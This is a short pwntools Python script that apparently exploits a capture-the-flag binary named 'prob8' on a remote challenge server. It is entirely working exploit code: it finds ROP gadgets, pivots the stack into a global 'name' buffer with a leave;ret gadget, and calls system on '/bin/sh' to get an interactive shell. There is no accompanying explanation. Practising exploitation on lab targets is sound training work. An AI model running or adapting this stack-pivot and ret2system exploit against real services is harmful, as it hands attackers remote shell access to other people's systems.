from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob8")
p = remote("fsi.zzado.kr", 9938)
e = ELF("./prob8")
lib = ELF('./libc.so.6')

r = ROP(e)
leave_ret = r.find_gadget(['leave','ret'])[0]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = r.find_gadget(['ret'])[0]
bss = e.bss()

name_buf = e.symbols['name']
system = e.plt['system']
binsh = 0x0000000000402008
main = e.symbols['main']

log.info(f'system : {hex(system)}')
log.info(f'binsh : {hex(binsh)}')
input(">>")
payload = b'\x00' * 0x700
payload += p64(name_buf + 0x800)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret_gadget)
payload += p64(system)

p.send(payload)
p.recv()

payload = b'a'* 0x20
payload += p64(name_buf + 0x700) #SFP
payload += p64(leave_ret)
p.send(payload)


p.interactive()

